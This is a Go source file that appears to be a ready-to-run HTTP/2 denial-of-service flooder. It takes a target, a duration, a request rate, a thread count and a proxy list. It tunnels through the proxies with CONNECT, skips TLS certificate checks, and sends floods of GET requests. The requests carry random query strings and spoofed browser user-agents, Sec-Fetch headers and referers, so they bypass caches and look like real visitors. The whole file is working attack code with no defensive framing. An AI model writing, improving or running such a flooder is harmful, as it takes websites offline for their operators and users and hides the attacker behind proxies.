package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

var (
	fetchSite = []string{"same-origin", "same-site", "cross-site"}
	fetchMode = []string{"navigate", "same-origin", "no-cors", "cors"}
	fetchDest = []string{"document", "sharedworker", "worker"}

	languages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"es-ES,es;q=0.9",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
	}

	useragents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
	}

	referers []string
)

type Args struct {
	target    string
	time      int
	rate      int
	threads   int
	proxyFile string
	extra     bool
	refFlag   bool
	proxies   []string
	targetURL *url.URL
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run miori.go [target] [time] [rate] [thread] [proxy] --extra --ref")
		os.Exit(0)
	}

	extra := false
	refFlag := false
	for _, arg := range os.Args {
		if arg == "--extra" {
			extra = true
		}
		if arg == "--ref" {
			refFlag = true
		}
	}

	targetURL, _ := url.Parse(os.Args[1])
	timeVal, _ := strconv.Atoi(os.Args[2])
	rateVal, _ := strconv.Atoi(os.Args[3])
	threadsVal, _ := strconv.Atoi(os.Args[4])

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://yandex.ru/",
		"https://t.co/",
		os.Args[1],
	}

	args := &Args{
		target:    os.Args[1],
		time:      timeVal,
		rate:      rateVal,
		threads:   threadsVal,
		proxyFile: os.Args[5],
		extra:     extra,
		refFlag:   refFlag,
		proxies:   readLines(os.Args[5]),
		targetURL: targetURL,
	}

	for i := 0; i < args.threads; i++ {
		go worker(args)
	}

	time.Sleep(time.Duration(args.time) * time.Second)
	os.Exit(1)
}

func worker(args *Args) {
	for {
		runFlooder(args)
	}
}

func runFlooder(args *Args) {
	if len(args.proxies) == 0 {
		return
	}

	proxyAddr := randomElement(args.proxies)
	parts := strings.Split(proxyAddr, ":")
	if len(parts) != 2 {
		return
	}

	connection, err := connectProxy(parts[0], parts[1], args.targetURL.Host)
	if err != nil {
		return
	}
	defer connection.Close()

	if tcpConn, ok := connection.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(600 * time.Second)
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         args.targetURL.Host,
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		},
	}

	tlsConn := tls.Client(connection, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		return
	}

	if tcpConn, ok := tlsConn.NetConn().(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(60 * time.Second)
	}

	transport := &http2.Transport{
		TLSClientConfig: tlsConfig,
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			return tlsConn, nil
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		for i := 0; i < args.rate; i++ {
			go sendRequest(client, args)
		}
	}
}

func connectProxy(host, port, target string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", host+":"+port, 100*time.Second)
	if err != nil {
		return nil, err
	}

	connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", target, target)
	_, err = conn.Write([]byte(connectReq))
	if err != nil {
		conn.Close()
		return nil, err
	}

	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil || !strings.Contains(response, "HTTP/1.1 200") {
		conn.Close()
		return nil, fmt.Errorf("invalid proxy response")
	}

	for {
		line, err := reader.ReadString('\n')
		if err != nil || line == "\r\n" {
			break
		}
	}

	return conn, nil
}

func buildHeaders(args *Args) http.Header {
	randQuery := "?" + randomString(12) + "=" + strconv.Itoa(randomInt(100000, 999999))
	path := args.targetURL.Path
	if path == "" {
		path = "/"
	}
	randPath := path + randQuery

	headers := http.Header{}
	headers.Set("User-Agent", randomElement(useragents))
	headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	headers.Set("Accept-Language", randomElement(languages))
	headers.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	headers.Set("Sec-Fetch-Site", randomElement(fetchSite))
	headers.Set("Sec-Fetch-Dest", randomElement(fetchDest))
	headers.Set("Sec-Fetch-Mode", randomElement(fetchMode))
	headers.Set("Upgrade-Insecure-Requests", "1")

	if args.extra {
		if rand.Float64() > 0.5 {
			headers.Set("Dnt", "1")
		}
		if rand.Float64() > 0.5 {
			headers.Set("Sec-Fetch-User", "?1")
		}
	}

	if args.refFlag {
		headers.Set("Referer", randomElement(referers)+randomString(5))
	}

	return headers
}

func sendRequest(client *http.Client, args *Args) {
	randQuery := "?" + randomString(12) + "=" + strconv.Itoa(randomInt(100000, 999999))
	path := args.targetURL.Path
	if path == "" {
		path = "/"
	}
	fullURL := fmt.Sprintf("https://%s%s%s", args.targetURL.Host, path, randQuery)

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return
	}

	headers := buildHeaders(args)
	req.Header = headers

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func readLines(filepath string) []string {
	data, err := os.ReadFile(filepath)
	if err != nil {
		return []string{}
	}

	lines := strings.Split(string(data), "\n")
	result := []string{}
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" {
			result = append(result, trimmed)
		}
	}
	return result
}

func randomString(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func randomInt(min, max int) int {
	return rand.Intn(max-min) + min
}

func randomElement(slice []string) string {
	if len(slice) == 0 {
		return ""
	}
	return slice[rand.Intn(len(slice))]
}
